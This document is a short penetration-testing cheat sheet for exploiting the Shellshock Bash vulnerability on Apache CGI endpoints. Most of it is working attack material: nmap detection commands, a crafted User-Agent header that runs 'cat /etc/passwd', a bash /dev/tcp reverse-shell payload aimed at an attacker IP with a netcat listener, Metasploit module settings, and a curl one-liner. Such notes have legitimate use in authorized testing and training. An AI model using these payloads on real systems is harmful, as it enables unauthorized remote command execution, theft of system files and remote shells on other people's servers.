The Shellshock vulnerability is caused by a ***vulnerability in Bash***, whereby Bash mistakenly ***executes trailing commands after a series of characters: () {:;};***. 

***Apache web servers*** configured to run `CGI scripts or .sh scripts are also vulnerable` to this attack. CGI (Common Gateway  Interface) scripts are used by Apache to execute arbitrary commands on the Linux system.

***

## Manual Attack
#### Enumerate
```
nmap -sV IP
nmap -sV --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" IP
```

Also, check the source page for the `cgi`. Input the `cgi` path on the `nmap-args`.

#### BurpSuite
- Turn on the BurpSuite proxy in the browser 
- Under Proxy > turn on intercept > send to repeater and navigate to the Repeater Tab.

Make sure the GET request is `GET /gettime.cgi HTTP/1.1`.
```
# Modify the User Agent under Request
User-Agent: () { :; }; echo; echo; /bin/bash -c "cat /etc/passwd"
```

- Click Send

#### Reverse Shell
**Terminal**
```
nc -nvlp 4444
```

**Burpsuite**
```
# Modify under Request
User-Agent: () { :; }; echo; echo; /bin/bash -c "bash -i>&/dev/tcp/Attacker's IP/4444 0>&1"
```


## Metasploit 
```
search shellshock
use /exploit/multi/http/apache_mod_cgi_bash_env_exec
set rhosts IP
set targeturi /gettime.cgi  ##--> cgi path
set lhost IP ##--> If not already set
run
```

## One Liner attack 
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \http://localhost:80/gettime.cgi
```

**URL** : hxxps://github.com/opsxcq/exploit-CVE-2014-6271